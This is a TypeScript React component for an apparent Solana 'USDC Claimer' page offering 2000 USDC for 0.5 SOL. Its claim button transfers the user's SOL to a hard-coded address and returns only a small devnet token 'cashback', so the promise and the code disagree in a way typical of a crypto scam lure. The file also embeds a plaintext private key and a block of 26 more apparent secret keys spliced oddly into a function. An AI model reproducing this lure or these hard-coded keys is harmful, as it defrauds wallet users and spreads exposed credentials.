/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "31vGQA5rk9d2SNtUWTJ5aqDP4bWcib4pkBeLUQP1zxxFBtfnFphCiW5NTHPti2utfvxd5KRexYb7NBuCeeCn8USa"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "51cNMMAKuLtb5HmtuMZiz73eDr5mZavasTeDwfW1e8mES1TWDt6Y8JeFBb1THMuZYgb3j93Nm4CCutniJG2nryFP",
  "key1": "2tyAaPhHcAAwtcFxFRi4GbLv47xPCXve2kPdddBD2xECqEAgF8GkvbZbKQgdT2egWBPoAKSznbwtZu2JPBg1iwz3",
  "key2": "3wjLJ579yJ6pD73LuVPETcBJUGgXbhcgLPd1bv6BmpdeBC2nJSScCs9EFnNwTie6Pmm4ueiZZbKaKvYcXMzCHErU",
  "key3": "ihvqKHbJEjvvhYsuBiR1zxAJzqb815Wtmo5aKHR75dJ8CojrfK7AENqiDiWk7AuwuwSHKX8yqYHJ8kRgiKDsquH",
  "key4": "2HiTRgbBd2ywV6KQLCAXwtZHdogxtyHAXFvhETiym8MMZmGegZzi11BKdTzw91TpE1NSXvst3iAYoRhhv1LWNA3R",
  "key5": "5Pf9BCDXoaaxDFTBcTSTBJcTbAfW1qVQabh85oda6tYfARfBE65w1YEB2xoPMs9iYXNuy5oWQsYnNxqi6NEDDnE3",
  "key6": "5ZrbbGhcKxGxVg3p6jb7xynC1Wk8CJ3fEjzquEJq7jJoSTLP1rZq6FgG8spwuCQ3s974SHSDmc1oQhmj3nnKub4X",
  "key7": "56ApdfrSzjmY3uDS22LSz2y4Txt7CdDfenegSPuHXgtdVsJ8m11Qq9RG1kgqmMaj1QgaYScAL7Qsep2Vfeiiz9dW",
  "key8": "MZAYBtpZb1BTrtRrvez8iytzESJpSZRQtG7zYbxbMM2ECj15rtMX1dL2ignE9aZtYmeLEpqdLXqfpeQvK54E7u9",
  "key9": "5zjB5Jk4KFeXcj6MJj53rghZsa59m4H3oMFCtj6RoBTE4dm8dK8wx8ufSKTeZGfR5Hd9bwNifCk7N2UnHPrms3qM",
  "key10": "3M2gMQUhocFYzwA8o43dMkwPQaxkf7KTUQ8CJaJemuVLWd5SnsZBN5a1vksmyczUAqLW3GBcPGsfhBks4Pfq3Jcn",
  "key11": "5HB2z64BGs5UCMD92HAFEt6V64mMxwijsDQHe4jaqwMNK72BG3waKEH5ux3rsPVXGDKfZXtQMLm41pbgdDLw7hYi",
  "key12": "3GkKLdVgNm37xHZyTjrs62aEEXT3w4FZmuP3RhJWHJrCG5G7LtnE2VjYrvqLR7h2Dp77RtCx3xQHn4VrQHxVxSBM",
  "key13": "3pw4R5ZgQ5bjxq5dWZJnsxPJ5jD5vX3CQy2kiHrNjZkGBzGSPoqrEzgWehr7tBLPTB3UebQ88Py3kn1uRVp8bejP",
  "key14": "2Fq7XmMaKhuovviGkzQiiUWAQpuT9xzzdK4CafoscCEKm4s3o671pxqLKEB7xiUsTAovJzRZ13MiD5iTb1rV5Wxo",
  "key15": "4iFSS6AygPghmomGuG6X7NmbBbifu5TUAgocxkguWvoSY9GQf3Kj9QSuHptdkp1FhCeNbWacECcuYvdhwCeFvzZk",
  "key16": "3Gzbv9pRKbtnzn26HFKKtF5DWs86qxtVZ7323GFrWbu3UW5tfow2qwqXCbhn6WBs7rBZyjPRNx9yPkrPQ7gngvRF",
  "key17": "4ULhq7AJjL27wihD8n78SXr4o5xi78a1Fd3zG4kY819PQmPX1hgHCDBipSTbSkQZRJ4qse5hQmHahPz1j1BUYuct",
  "key18": "4ZruAGMPt8gU69APqKCdhJZKAtE1ZHsxhZF2JZL6GQgjeTztEx2CqkRqX5A1gS9FXXUgiqqShEsYwixkoS6K4SQ4",
  "key19": "5EdXxMsWjTzdwapiWBw2iQpzosavw9fAs5waQjvCmRsXFU5by3LYC7nMEoHu1MSpPRxWG8FgeYDAM7z5uDEPYo57",
  "key20": "24keXKHRyE2tny1XAz4SUNFFYCZ62moiFNeNGTojU1BoTMu87wgJ565ii3qZ7d6YG3xaw8AxMrpA6ByEX15bhQd4",
  "key21": "2h1fgCZxQxorXgUP6XDdJoT47Rp5PQj885ydSQqywE8gA4kBNXPSQw3K5mPJJ3fDCFoCPUBnby2yn4rFpCTjqHsP",
  "key22": "33LaenEvdVWwYufL4J256D3pBhdHB6u6Lyh5EN2Ubp4ZC76fiWhxFmJF6AMjSg1aY5q1Jbq5U7A5eGCsbCRuD71b",
  "key23": "2rLc2AU15fNux9AdZ9v13u5jT7oTPA6wHJuuzBJCvUuuNkNwHxES8kXBPvQSvL2xdo1h8HtEKtB9Vg7GL4x4JpRK",
  "key24": "36TumEx8SZChd4eEwqGB3KruVprDzndspQM6M6HCcktxFUToZK61VyWCaXuN3ryJmZP11wux6J1oD996xHXPDcPB",
  "key25": "L8w1SdYhTkMSmDVRiuhS8wfNB1ZjLh6i5p13b2Xt2rtc47f33FR6kK8kbJtU1ZJKfHsQh9i4CiLMj7yidPW2SzP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
